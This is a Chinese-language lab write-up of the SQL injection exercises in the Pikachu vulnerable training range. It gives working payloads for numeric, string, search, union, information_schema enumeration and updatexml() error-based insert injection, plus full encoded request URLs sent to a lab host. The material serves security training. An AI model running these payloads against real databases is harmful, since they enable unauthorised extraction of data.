# Pikachu靶场通关之SQL注入

## 1、Sql-Inject-SQL注入漏洞目录

![image-20210105103649228](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105103649228.png)

## 2、SQL注入漏洞概述

![image-20210105111225910](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105111225910.png)

当我们正常输入，它的返回值也是正常的。我们非法输入`１or１=１`的时候，就会把所有数据遍历出来。

![image-20210105111517020](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105111517020.png)

## 3、SQL注入攻击流程

![image-20210105111928784](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105111928784.png)

## 4、常见的注入点类型

![image-20210105124340122](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105124340122.png)

## 5、数字型注入

下面我们先看看如何判断数字类型的sql注入：

![image-20210105133744885](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105133744885.png)

![image-20210105133841686](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105133841686.png)下面我们就进行靶场演示~

![image-20210105124809129](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105124809129.png)

这题输入是从一个select box选择一个数字，post提交后端数据库查询，输出是用户名和email。猜想后端执行了这样一句SQL语句：

```mysql
select 字段1, 字段2 from 用户表 where id=1; #猜想的结果
#因为下拉框做的数字选项，所以后端接收应该是：$id=$_POST['id']
select 字段1, 字段2 from 用户表 where id=$id;
select username字段, email字段 from 用户表 where userid=$_POST(userid);
```

下面，我们选择数字1，burp抓包看一下结果~

![image-20210105125826105](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105125826105.png)

最常见的也是最简单的构造注入是闭合sql语句最后一个字段并插入新的字符。随便提交一个数字如1，burp抓包放到repeater模板, post的参数改为`id=1'&submit=%E6%9F%A5%E8%AF%A2`，试着用`'`闭合语句，果然有回显报错。

```mysql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

![image-20210105131434895](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105131434895.png)

从报错信息可以确认注入漏洞存在且后端数据库为mysql，如果对mysql语句比较了解这里就可以自己构造的payload了，有回显报错的也可以根据报错逐渐调整语句。

接下来我们尝试使用 `1 or 1=1`看看后台是不是能将一整段当作一个语句来执行。

这里我们可以看到，已经成功执行了并且把所有人的信息都输出到了页面上。这也就意味着，这里存在sql注入漏洞 。

![image-20210105131708246](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105131708246.png)

如我们想要确认数据库版本，手工注入的话，可以先来确定列数量。先试着order by 3 报错，说明查询出来的列数小于3

```
id=1 order by 3&submit=%E6%9F%A5%E8%AF%A2
```

![image-20210105132253272](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105132253272.png)

order by 2的时候可以正常执行，说明查询结果返回的列数是2。

![image-20210105132346015](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105132346015.png)

知道列数之后对我们后面手工构造注入语句是非常关键的一步。构造payload确定输出回显位置。

```
id=1 union select 1,2&submit=%E6%9F%A5%E8%AF%A2
```

![image-20210105133148633](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105133148633.png)

通过这步的回显`hello 1, your email is:2`我们知道了查询的回显位置，也可大概判断出这两个查询结果数据类型应该是字符，如果想要继续手工注入，比如通过前面的报错回显，我们已经确定后端数据是mysql了，那它版本是多少呢？可以构造payload如：

```
id=1 union select @@version,2&submit=%E6%9F%A5%E8%AF%A2
```

结果为

```
hello,5.7.26 your email is: 2
```

![image-20210105133224438](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105133224438.png)

这样就得到了数据库版本为，mysql 5.7.26。SQLI的利用原理大体如此。

**代码解析：**

这就是数字类型注入的后端代码。没有做任何过滤直接拼接所以导致注入。

![image-20210105133910249](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105133910249.png)

## 6、字符型注入（GET）

我们先看PPT字符类型的sql注入如何判断。

![image-20210105134207317](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105134207317.png)

![image-20210105134327341](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105134327341.png)

这里的字符型输入有个输入框，GET方法传参name。先输入LUCY试试，查询结果为

```
your uid:6
your email is: lucy@pikachu.com
```

![image-20210105141019196](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105141019196.png)

同样的思路在结尾加上’ sql报错`lucy '`

![image-20210105141147055](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105141147055.png)

其实有报错回显是sql注入最简单的一种情况，用上面数字类型同样的payload发现已经用不了了。比如：

```
lucy or 1=1
```

![image-20210105142242320](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105142242320.png)

还是从原始sql语句考虑，一般字符类型的插入语句可能是：

```mysql
select 字段1,字段2 form 用户表 where username='lucy';
# 后端接收：$uname=$GET['uname']
select 字段1,字段2 form 用户表 where username='uname';
select uid字段, email字段 from 用户表 where username='$_GET(username);'
```

因为写sql的时候字符类型可能就是用单引号或者双引号扩起来的。想要插入的语句可以闭合并正常执行，那就要考虑闭合前面字符串的引号，同时通过前面的注入我们知道数据库是mysql, 想让语句结尾的引号失效可以用单行注释#

```
lucy ' or 1=1#
```

![image-20210105151015516](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105151015516.png)

比如想要执行

```
select 1,'Inject by C'
```

payload就要写成

```mysql
' union select 1,'Inject by C'#
```

![image-20210105141524495](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105141524495.png)

拼接到原来语句中就是一个完整的注入语句了。

```mysql
select uid字段, email字段 from 用户表表 where username='' union select 1,'Inject by C'#'
```

GET传参数注意要url编码，所以完整payload是

```http
http://123.56.245.68:83/vul/sqli/sqli_str.php?name='%20union%20select%201%2c'Inject by C'%23
&submit=%E6%9F%A5%E8%AF%A2
```

好了，演练就到这里了。下面我们来看一下代码审计：

这个和上面的区别就是多了一个字符串加了单引号。

![image-20210105151330313](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105151330313.png)

## 7、搜索型注入

![image-20210105153218645](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105153218645.png)

我们先随便输入尝试一下。输入l，看看返回什么结果。

![image-20210105153435939](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105153435939.png)

一般搜索功能都会用到SQL模糊匹配功能，如：搜索所有用户名含有k的用户

```
select * from USER where usename='%l%';
```

构造payload的思路和字符型一样，构造闭合就好了，可以构造payload

```mysql
l%' union select 1,2,'sqlitest'#
```

url编码并整合到get传参给服务器执行

```http
http://123.56.245.68:83/vul/sqli/sqli_search.php
?name=l%25'%20union%20select%201%2c2%2c'sqlitest'%23
&submit=%E6%90%9C%E7%B4%A2
```

![image-20210105153659170](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105153659170.png)

```
当然我们也可以构建n多payload: like '%xxxx%'or 1=1#%'
xxxx%'or 1=1#
```

下面我们来看一看源码：

![image-20210105153725078](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105153725078.png)

## 8、XX型注入

![image-20210105172756694](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105172756694.png)

其实通过前面的三种情况也可以看出来了，SQL注入就是猜测语句拼接应该是什么和确认构造的payload是否执行。通过查询参数结尾加上’的报错回显是一种确认sql注入的方式，当然也有不回显的其他注入。

![image-20210105172829889](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105172829889.png)

一般判断语句有没有执行也可以通过`' and 1=2 #`、`' or 1=1 #`这样的逻辑表达式拼接在语句后面观察结果不同。

这里我们先随便输入lucy看看返回结果

![image-20210105173001394](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105173001394.png)

和前面一样的方法测试闭合,测试到:

```
lucy')#

http://xxx/vul/sqli/sqli_x.php?name=lucy')%20union%20select%201,'sqlitest'%23&submit=%E6%9F%A5%E8%AF%A2
```

![image-20210105173310173](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105173310173.png)

发现语句可以正常执行，说明这里拼接的语句闭合还要加上括号。在注释前面加上想要执行的语句试试，成功注入

```
观察URL：http://123.56.245.68:83/vul/sqli/sqli_x.php?name=lucy&submit=%E6%9F%A5%E8%AF%A2
我们可以构造此payload: name=('xx') or 1=1 #')
xx') or 1=1 #
```

![image-20210105173147615](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105173147615.png)

## 9、补充说明

补充：看到字符串，联想到单引号或者双引号做闭合测试

![image-20210105173656545](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105173656545.png)

![image-20210105174003532](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105174003532.png)

## 10、union注入

![image-20210106112113120](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106112113120.png)

```mysql
select id,email from member where username='lucy';
# union查询的时候要和主查询一样，要么都有2个字段要么都是3个字段
select id,email from member where username='lucy' union select username,passwd from member where id=1;
```

查看当前数据库、权限、版本

![image-20210106115034527](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106115034527.png)

![image-20210106172156936](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106172156936.png)

下面我们使用字符型注入来演示union注入

![image-20210106122735683](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106122735683.png)

那么当我们使用union查询的时候，要与字段数符合。然而我们并不知道有多少字段。下面我们就需要猜测字段数了。这里使用 `order by` 这个方法进行猜测。

![image-20210106172234151](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106172234151.png)

```
lucy' order by 1#
lucy' order by 2#
lucy' order by 3#      3报错了，那么说明我们的主查询只有两个字段
```

![image-20210106124724517](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106124724517.png)

下面我们构建union查询-这样我们就查看到了数据库名称以及用户权限显示出来了。

```
lucy' union select database(),user()#
```

![image-20210106171941995](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106171941995.png)

**MYSQL小知识的补充：information_schema**

![image-20210106172302096](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106172302096.png)

## 11、information_schema手工注入

![image-20210106172614577](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210106172614577.png)

```mysql
information_schema # Mysql自带默认数据库
use information_schema;
show tables;
# 在这些表里面，有两个重要的表
# 第一个是TABLES。下面我们看看TABLES里面的字段
desc tables;
# 在这个表里面它会存 TABLE_SCHEMA 也就是说他会把整个数据库实例里面的表的相关信息都放在这里面。
# 当然，还有一个 COLUMNS 这个表。我们也来看一下这个表中存在什么
desc columns;
# 在这里也有 TABLE_SCHEMA 也就是说，所有的数据库实例的名称信息都会放在这个表里面。这里面多出来一个 列名 他会把所有列的信息也会记录下来。
```

**获取表名的MySQL语句：**

```mysql
select id,email from member where username = 'lucy' union select table_schema,table_name from information_schema.tables where table_schema='pikachu';
```

那么我们的payload就需要这样编写

```
lucy' union select table_schema,table_name from information_schema.tables where table_schema='pikachu'#
```

![image-20210107143922622](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210107143922622.png)

**获取字段名的MySQL语句：**

```mysql
select id,email from member where username = 'lucy' union select table_name,column_name from information_schema.columns where table_name='users';
```

**Payload:**

```
lucy' union select table_name,column_name from information_schema.columns where table_name='users'#
```















前面都基于union或者select查询的注入，但其实插入和更新也是可以是注入的，不仅可能是sql注入，也可能存在存在存储型xss（比如这里注册的时候用户写![img](https://blog.csdn.net/cynthrial/article/details/x), 登录的时候你就可以发现弹窗了）。insert注入的时候如果通过子查询语句拼接并登录上去在找刚才插入的位置，每次测试都要注册一个帐号，那就比较麻烦了。基于updatexml()、extractvalue()、floor()等构造报错点输出我们想要的数据就比较方便了。对于insert语句一般比较常见类似这种

```mysql
insert into USERS（username, passwd,email） values('','','')
```

想要插入语句的时候可以通过or来构造闭合，比如username填入字段

`' or evil_sql or '`, 插入到原句中就可以实现执行恶意语句的效果

```mysql
insert into USERS（username, passwd,email） values('' or evil_sql or','','')
```

基于报错注入用户名处payload就为

```
kobe2' or updatexml(1,concat(0x7e,version()),0) or '
```

然后密码字段随便输入一个提交就能发现我们查询版本的的报错回显：

```
XPATH syntax error: '~5.7.27'
```

UPDATE的注入同理，也是可以用同样的payload，需要注意的是，填写update表单的时候记得每一栏都要填上再点submit，不然是不执行的，这个是靶场后端代码的问题。









































































